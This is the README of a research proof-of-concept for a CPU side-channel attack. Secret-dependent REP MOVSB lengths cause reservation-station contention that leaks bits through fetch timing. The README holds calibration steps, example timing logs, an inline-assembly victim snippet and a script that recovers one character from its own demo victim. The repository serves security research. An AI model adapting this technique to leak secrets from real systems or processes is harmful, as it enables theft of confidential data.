This PoC demonstrates silent branches via predication by exploiting resource contention caused by the `REP MOVSB` instruction. It implements **Section VI-A-2)** of our paper.  

This PoC leverages the difference in the number of micro-operations generated by `REP MOVS`-class instructions under different RCX values. By crafting a `REP MOVSB` instruction with a secret-dependent `RCX`, it induces Reservation Station (RS) contention in a secret-dependent manner. The resulting contention delays the fetch of subsequent instructions, forming an I-cache side channel that leaks secrets.

---

## Folder Structure

### `rcx_threshold_eval/`
 Evaluates the impact of different `RCX` values on the execution time of a `CALL` instruction to a dummy function.
- Includes a script (`run_measuret.sh`) to automate the  threshold evaluation and generate corresponding log (`run_all_output.log`) .
- Provides a log analysis script (`analyze.py`) to help determine the appropriate `RCX` and time threshold.
- Example logs are provided for reference.
### `REPms-RSAttack/`
Contains the full attack code.
- Requires manual configuration of `RCX` and time threshold values based on the results obtained from the evaluation phase. 
- Provides an automated attack script (`analyze_chars.sh`) that demonstrates 8-bit secret leakage.

---
## Test Environment:
This attack has been validated in the following environment:
- Intel® Core™ i9-13900K processor running Ubuntu 22.04 with Linux kernel version 6.8.0-59-generic. 
- A VMware virtual machine with the Intel® Core™ i7-14650HX processor, running Ubuntu 22.04.5 LTS (kernel 6.8.0-59-generic).

## How to Use

### Step 1: Determine RCX and Time Threshold 

To identify the RCX value at which `REP MOVSB` begins to cause measurable resource contention, as well as the corresponding time threshold that reflects the time difference caused by this contention:

1. Navigate to the threshold evaluation folder:
   ```bash
   cd ./rcx_threshold_eval

2. Edit the `Makefile` and set `LIBDIR` to the absolute path of this directory. For example:
   ```bash
   LIBDIR = /full/path/to/attackPoC/rcx_threshold_eval

3. Run the measurement script:
   ```bash
    bash run_measuret.sh
   ```
   This script tests a set of predefined RCX values ( can be modified based on the test results):
   ```bash
    rcx_values=(0 4 8 16 32 64 72 80 128 256 512)
   ```
   The log file run_all_output.log shows the measured fetch latency for each RCX value. For instance:

- When `RCX = 128`：
   ```bash
   Running with RCX = 128
   got time 48 
   got time 50 
   got time 50 
   got time 46 
   got time 48 
   got time 48 
   got time 48 
   got time 48 
   got time 46 
   got time 50 
   got time 48 
   got time 50 
   got time 34 
   got time 34 
   got time 50 
   got time 130 
   got time 48 
   got time 48 
   got time 196 
   got time 36 
   ```
- When `RCX = 256`：
   ``` bash
   Running with RCX = 256
   got time 262 
   got time 220 
   got time 230 
   got time 226 
   got time 226 
   got time 222 
   got time 670 
   got time 592 
   got time 226 
   got time 222 
   got time 222 
   got time 234 
   got time 594 
   got time 602 
   got time 48 
   got time 224 
   got time 226 
   got time 220 
   got time 224 
   got time 110 
   ```

4. Run `analyze.py` to determine the optimal `RCX` values and time threshold by analyzing the `run_all_output.log`. You can first estimate a reasonable threshold range based on initial `run_all_output.log` data, for example:

   ```bash
   time_thresholds = [90, 100, 110, 120, 130, 140, 150, 160, 170, 180]
   ```
The goal is to select the optimal `RCX`and time threshold:
- for secret bit 0, maintain a low percentage of >threshold events.
- for secret bit 1, maintain a high percentage of >threshold events.

Below is a part of an example output:
   ```bash
   using time threshold = 160
  
   RCX | # Total | # <=threshold |  # >threshold | >threshold %
   --------------------------------------------------
     0 |      20 |            17 |             3 |       15.0%
     4 |      20 |            19 |             1 |        5.0%
     8 |      20 |            16 |             4 |       20.0%
    16 |      20 |            18 |             2 |       10.0%
    32 |      20 |            15 |             5 |       25.0%
    64 |      20 |            17 |             3 |       15.0%
    72 |      20 |            14 |             6 |       30.0%
    80 |      20 |            17 |             3 |       15.0%
   128 |      20 |            15 |             5 |       25.0%
   200 |      20 |             1 |            19 |       95.0%
   256 |      20 |             1 |            19 |       95.0%
   300 |      20 |             4 |            16 |       80.0%
   400 |      20 |             3 |            17 |       85.0%
   500 |      20 |             1 |            19 |       95.0%
   512 |      20 |             0 |            20 |      100.0%
   600 |      20 |             0 |            20 |      100.0%
   640 |      20 |             1 |            19 |       95.0%
   700 |      20 |             0 |            20 |      100.0%
  
   >>> Best RCX value (highest >threshold % rate): 512
  
   Using time threshold = 170
  
   RCX | # Total | # <=threshold |  # >threshold | >threshold %
   --------------------------------------------------
     0 |      20 |            17 |             3 |       15.0%
     4 |      20 |            19 |             1 |        5.0%
     8 |      20 |            16 |             4 |       20.0%
    16 |      20 |            18 |             2 |       10.0%
    32 |      20 |            16 |             4 |       20.0%
    64 |      20 |            17 |             3 |       15.0%
    72 |      20 |            14 |             6 |       30.0%
    80 |      20 |            18 |             2 |       10.0%
   128 |      20 |            16 |             4 |       20.0%
   200 |      20 |             1 |            19 |       95.0%
   256 |      20 |             1 |            19 |       95.0%
   300 |      20 |             4 |            16 |       80.0%
   400 |      20 |             3 |            17 |       85.0%
   500 |      20 |             1 |            19 |       95.0%
   512 |      20 |             0 |            20 |      100.0%
   600 |      20 |             1 |            19 |       95.0%
   640 |      20 |             1 |            19 |       95.0%
   700 |      20 |             0 |            20 |      100.0%
  
   >>> Best RCX value (highest >threshold % rate): 512
  
   Using time threshold = 180
  
   RCX | # Total | # <=threshold |  # >threshold | >threshold %
   --------------------------------------------------
     0 |      20 |            17 |             3 |       15.0%
     4 |      20 |            20 |             0 |        0.0%
     8 |      20 |            16 |             4 |       20.0%
    16 |      20 |            18 |             2 |       10.0%
    32 |      20 |            16 |             4 |       20.0%
    64 |      20 |            17 |             3 |       15.0%
    72 |      20 |            14 |             6 |       30.0%
    80 |      20 |            18 |             2 |       10.0%
   128 |      20 |            16 |             4 |       20.0%
   200 |      20 |             1 |            19 |       95.0%
   256 |      20 |             1 |            19 |       95.0%
   300 |      20 |             4 |            16 |       80.0%
   400 |      20 |             3 |            17 |       85.0%
   500 |      20 |             1 |            19 |       95.0%
   512 |      20 |             0 |            20 |      100.0%
   600 |      20 |             1 |            19 |       95.0%
   640 |      20 |             1 |            19 |       95.0%
   700 |      20 |             0 |            20 |      100.0%
  
   >>> Best RCX value (highest >threshold % rate): 512
  
   ```
   From the above results, we can choose: `RCX` = 4 for secret bit 0,`RCX` = 512 for secret bit 1, time threshold = 180

### Step 2: Launch the Attack

1. Navigate to the main attack folder:
   ```bash
   cd ../REPms-RSAttack

2. Edit the `victimfunction` in v1REP.c based on your threshold findings  in the previous step. Example:
   ```bash
   mov     $0x200, %%rdx      ; //RCX value for secret bit 1 (e.g., 512)
   mov     $4, %%rcx          ; //RCX value for secret bit 0 (e.g., 4)
   mov     $0, %%r10d
   cmp     %%ebx, %%r10d
   cmovne  %%rdx, %%rcx       ; //Conditional RCX assignment based on secret
   ```
   ```bash
   results[bit]=(start > 180)?1:0; //Determine secret bit based on time threshold
   ```

3. Run the bitwise secret leakage attack:
   ```bash
    bash ./analyze_chars.sh U
   ```
- `U` specifies the target secret character to leak.
- Each round leaks 8 bits and the leakage is reported after multiple iterations (e.g., 20, 50).
- Example Output:
   ```bash
   === Character Statistics ===
   _: 3
   ]: 4
   W: 6
   U: 26
   E: 1
   }: 2
   u: 2
   �: 1
   �: 2
   �: 3
   The most frequent character (guessed secret character) is: U
   ```

